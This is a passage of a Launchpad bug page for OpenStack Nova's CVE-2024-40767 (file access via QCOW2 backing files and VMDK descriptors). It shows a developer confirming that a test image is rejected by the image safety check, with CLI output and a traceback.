  
</div>

          

          

          

        
        
          

          
              <div class="boardComment">
  <div class="boardCommentDetails">
    
      <a href="https://launchpad.net/~fungi" class="sprite person">Jeremy Stanley (fungi)</a>
    
    <time title="2024-07-10 17:26:07 UTC" datetime="2024-07-10T17:26:07.085026+00:00">on 2024-07-10</time>
  </div>
  <div class="boardCommentActivity">
    <table class="bug-activity">
  
    
      
    
    <tr>
      <td style="text-align: right;">
        <b>summary</b>:
      </td>
      <td>
        - Regression VMDK/qcow arbitrary file access<br />+ Regression VMDK/qcow arbitrary file access (CVE-2024-40767)
      </td>
    </tr>
  
</table>
  </div>
</div>
          

          

        
        
          

          
              <div class="boardComment">
  <div class="boardCommentDetails">
    
      <a href="https://launchpad.net/~fungi" class="sprite person">Jeremy Stanley (fungi)</a>
    
    <time title="2024-07-16 19:23:22 UTC" datetime="2024-07-16T19:23:22.795698+00:00">on 2024-07-16</time>
  </div>
  <div class="boardCommentActivity">
    <table class="bug-activity">
  
    
      
    
    <tr>
      <td style="text-align: right;">
        <b>summary</b>:
      </td>
      <td>
        - Regression VMDK/qcow arbitrary file access (CVE-2024-40767)<br />+ Incomplete file access fix and regression for QCOW2 backing files and<br />+ VMDK flat descriptors (CVE-2024-40767)
      </td>
    </tr>
  
</table>
  </div>
</div>
          

          

        
        
          

          

          
              <div>
  <div id="comments-container"></div>
  <div class="boardComment comments-hidden-message" style="border-bottom: 0">
    <div class="boardCommentDetails">
      <table>
        <tbody>
          <tr>
            <td>
              <span class="sprite arrowRight"></span>
              30 comments hidden
              <span id="more-comments-spinner" class="hidden">
                Loading more comments
                <img src="/@@/spinner" />
              </span>
            </td>

            <td class="bug-comment-index">
              <a href="?comments=all" id="show-comments-link" class="show-comments-link sprite retry" style="white-space: nowrap">
                 view all 110 comments</a>
            </td>
          </tr>
        </tbody>
      </table>
    </div>
  </div>
</div>
          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2071734/comments/71" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~sean-k-mooney" class="sprite person">sean mooney (sean-k-mooney)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-07-20T12:09:19.329450+00:00" title="2024-07-20 12:09:19 UTC">on 2024-07-20</time><span class="editable-message-last-edit-date">:
              </span>
              <a href="/nova/+bug/2071734/comments/71">
                <strong>Re: Incomplete file access fix and regression for QCOW2 backing files and VMDK flat descriptors (CVE-2024-40767)</strong>
              </a>
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2071734/comments/71"> #71</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  <a href="https://bugs.launchpad.net/nova/+bug/2071734/comments/71/+download">Download full text</a> (104.1 KiB)
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>if i do it the other way around</p>
<p>boot form a bad image and rescue with a good one its also blocked</p>
<p>(overcloud) [stack@undercloud-0 test_images]$ openstack server show rescue<br />
+------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />---+---<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />...</p></div>
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">if i do it the other way around

boot form a bad image and rescue with a good one its also blocked


(overcloud) [stack@undercloud-0 test_images]$ openstack server show rescue
+-------------------------------------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| Field                               | Value                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
+-------------------------------------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| OS-DCF:diskConfig                   | MANUAL                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     |
| OS-EXT-AZ:availability_zone         |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |
| OS-EXT-SRV-ATTR:host                | None                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| OS-EXT-SRV-ATTR:hypervisor_hostname | None                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| OS-EXT-SRV-ATTR:instance_name       | instance-0000004a                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          |
| OS-EXT-STS:power_state              | NOSTATE                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    |
| OS-EXT-STS:task_state               | None                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| OS-EXT-STS:vm_state                 | error                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
| OS-SRV-USG:launched_at              | None                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| OS-SRV-USG:terminated_at            | None                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| accessIPv4                          |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |
| accessIPv6                          |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |
| addresses                           |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |
| config_drive                        |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |
| created                             | 2024-07-20T12:07:43Z                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| fault                               | {'code': 500, 'created': '2024-07-20T12:07:47Z', 'message': 'Build of instance 9b02f5ea-288c-4d56-9a5d-a5b12c362adf aborted: Image 0ca27d66-f167-4455-82e6-5732e26829c5 is unacceptable: Image not in a supported format', 'details': 'Traceback (most recent call last):\n  File "/usr/lib/python3.9/site-packages/nova/virt/images.py", line 160, in do_image_deep_inspection\n    raise exception.ImageUnacceptable(\nnova.exception.ImageUnacceptable: Image 0ca27d66-f167-4455-82e6-5732e26829c5 is unacceptable: Image does not pass safety check\n\nDuring handling of the above exception, another exception occurred:\n\nTraceback (most recent call last):\n  File "/usr/lib/python3.9/site-packages/nova/compute/manager.py", line 2512, in _build_and_run_instance\n    self.driver.spawn(context, instance, image_meta,\n  File "/usr/lib/python3.9/site-packages/nova/virt/libvirt/driver.py", line 4261, in spawn\n    created_instance_dir, created_disks = self._create_image(\n  File "/usr/lib/python3.9/site-packages/nova/virt/libvirt/driver.py", line 4656, in _create_image\n    created_disks = self._create_and_inject_local_root(\n  File "/usr/lib/python3.9/site-packages/nova/virt/libvirt/driver.py", line 4784, in _create_and_inject_local_root\n    self._try_fetch_image_cache(backend, fetch_func, context,\n  File "/usr/lib/python3.9/site-packages/nova/virt/libvirt/driver.py", line 10525, in _try_fetch_image_cache\n    image.cache(fetch_func=fetch_func,\n  File "/usr/lib/python3.9/site-packages/nova/virt/libvirt/imagebackend.py", line 275, in cache\n    self.create_image(fetch_func_sync, base, size,\n  File "/usr/lib/python3.9/site-packages/nova/virt/libvirt/imagebackend.py", line 582, in create_image\n    prepare_template(target=base, *args, **kwargs)\n  File "/usr/lib/python3.9/site-packages/oslo_concurrency/lockutils.py", line 360, in inner\n    return f(*args, **kwargs)\n  File "/usr/lib/python3.9/site-packages/nova/virt/libvirt/imagebackend.py", line 272, in fetch_func_sync\n    fetch_func(target=target, *args, **kwargs)\n  File "/usr/lib/python3.9/site-packages/nova/virt/libvirt/utils.py", line 470, in fetch_image\n    images.fetch_to_raw(context, image_id, target, trusted_certs)\n  File "/usr/lib/python3.9/site-packages/nova/virt/images.py", line 198, in fetch_to_raw\n    force_format = do_image_deep_inspection(img, image_href, path_tmp)\n  File "/usr/lib/python3.9/site-packages/nova/virt/images.py", line 180, in do_image_deep_inspection\n    raise exception.ImageUnacceptable(\nnova.exception.ImageUnacceptable: Image 0ca27d66-f167-4455-82e6-5732e26829c5 is unacceptable: Image not in a supported format\n\nDuring handling of the above exception, another exception occurred:\n\nTraceback (most recent call last):\n  File "/usr/lib/python3.9/site-packages/nova/compute/manager.py", line 2329, in _do_build_and_run_instance\n    self._build_and_run_instance(context, instance, image,\n  File "/usr/lib/python3.9/site-packages/nova/compute/manager.py", line 2597, in _build_and_run_instance\n    raise exception.BuildAbortException(instance_uuid=instance.uuid,\nnova.exception.BuildAbortException: Build of instance 9b02f5ea-288c-4d56-9a5d-a5b12c362adf aborted: Image 0ca27d66-f167-4455-82e6-5732e26829c5 is unacceptable: Image not in a supported format\n'} |
| flavor                              | test (5001348c-d056-42f7-95d6-d9b025719732)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                |
| hostId                              |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |
| id                                  | 9b02f5ea-288c-4d56-9a5d-a5b12c362adf                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| image                               | bad-qcow-with-datafile.qcow2 (0ca27d66-f167-4455-82e6-5732e26829c5)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        |
| key_name                            | None                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| name                                | rescue                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     |
| project_id                          | b22c3c73ed8d478199eaf01ef608a90a                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
| properties                          |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |
| status                              | ERROR                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
| updated                             | 2024-07-20T12:07:47Z                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| user_id                             | 7ad2588ea74e4a10b7ad26563984bd54                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
| volumes_attached                    |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |
+-------------------------------------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
(overcloud) [stack@undercloud-0 test_images]$ openstack server rescue --image  cirros-0.5.2-x86_64-disk.img rescue
Instance 9b02f5ea-288c-4d56-9a5d-a5b12c362adf is in an invalid state for 'rescue' (HTTP 409) (Request-ID: req-10248685-c2b6-40ce-abd0-daa216424097)
</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2071734/comments/72" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
